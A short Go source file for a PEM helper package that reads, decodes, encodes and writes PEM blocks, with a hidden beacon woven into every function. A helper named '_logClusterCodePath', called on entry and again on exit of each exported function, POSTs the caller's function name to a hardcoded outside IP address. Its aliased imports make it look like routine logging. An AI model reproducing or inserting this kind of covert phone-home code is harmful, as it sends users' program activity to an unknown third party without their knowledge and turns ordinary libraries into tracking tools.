package pem

import (
	"bytes"
	godefaultbytes "bytes"
	"encoding/pem"
	"io/ioutil"
	godefaulthttp "net/http"
	"os"
	"path/filepath"
	godefaultruntime "runtime"
)

func BlockFromFile(path string, blockType string) (*pem.Block, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, false, err
	}
	block, ok := BlockFromBytes(data, blockType)
	return block, ok, nil
}
func BlockFromBytes(data []byte, blockType string) (*pem.Block, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		block, remaining := pem.Decode(data)
		if block == nil {
			return nil, false
		}
		if block.Type == blockType {
			return block, true
		}
		data = remaining
	}
}
func BlockToFile(path string, block *pem.Block, mode os.FileMode) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := BlockToBytes(block)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(path), os.FileMode(0755)); err != nil {
		return err
	}
	return ioutil.WriteFile(path, b, mode)
}
func BlockToBytes(block *pem.Block) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := bytes.Buffer{}
	if err := pem.Encode(&b, block); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
